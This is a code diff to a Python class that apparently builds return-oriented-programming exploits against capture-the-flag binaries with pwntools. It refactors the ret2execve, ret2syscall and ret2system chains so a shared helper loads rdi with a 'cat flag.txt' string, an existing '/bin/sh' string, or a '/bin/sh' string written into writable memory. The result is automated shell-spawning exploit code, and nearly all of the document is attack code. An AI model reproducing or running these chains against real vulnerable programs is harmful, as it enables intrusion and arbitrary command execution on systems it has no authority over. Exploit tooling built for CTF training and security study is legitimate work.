@@ -42,7 +42,7 @@ class ROP:
                 elif self.analysis.has_syscall():
                     payload = self.ret2syscall(failed)
                 elif self.analysis.has_system():
-                    payload = self.ret2system()
+                    payload = self.ret2system(failed)
                 else:
                     payload = self.ret2win_with_args(failed)
             else:
@@ -92,7 +92,7 @@ class ROP:
 
     def ret2execve(self, failed):
         payload = cyclic(self.offset)
-        payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
         if failed:
@@ -104,7 +104,7 @@ class ROP:
     def ret2syscall(self, failed):
         payload = cyclic(self.offset)
         payload += self.fill_reg("rax", 59)
-        payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
         if failed:
@@ -115,14 +115,7 @@ class ROP:
     
     def ret2system(self, failed):
         payload = cyclic(self.offset)
-        if self.analysis.has_catflagtxt():
-            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
-        elif self.analysis.has_binsh():
-            payload += self.fill_reg("rdi", self.analysis.get_binsh())
-        else:
-            payload += self.write_binsh_to_mem()
-            payload += self.fill_reg("rdi", self.get_writeable_mem())
-            
+        payload += self.generic_first_arg() 
         payload += self.fill_reg("rsi", 0)
         if failed:
             payload += self.realign()
@@ -135,6 +128,19 @@ class ROP:
         p = process(self.filename)
         p.recvuntil(b": ")
         leak = p.recvline().decode('utf-8').strip()
+        
+        return payload
+
+    def generic_first_arg(self):
+        payload = b""
+
+        if self.analysis.has_catflagtxt():
+            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
+        elif self.analysis.has_binsh():
+            payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        else:
+            payload += self.write_binsh_to_mem()
+            payload += self.fill_reg("rdi", self.get_writeable_mem())
         
         return payload
 
